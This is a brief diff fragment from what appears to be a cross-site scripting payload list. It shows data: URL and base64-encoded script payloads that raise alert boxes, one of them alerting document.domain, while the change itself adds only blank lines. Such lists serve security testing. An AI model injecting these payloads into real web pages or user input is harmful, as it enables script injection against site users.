@@ -16,3 +16,5 @@ data:text/html,<script>alert(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 ```
+
+
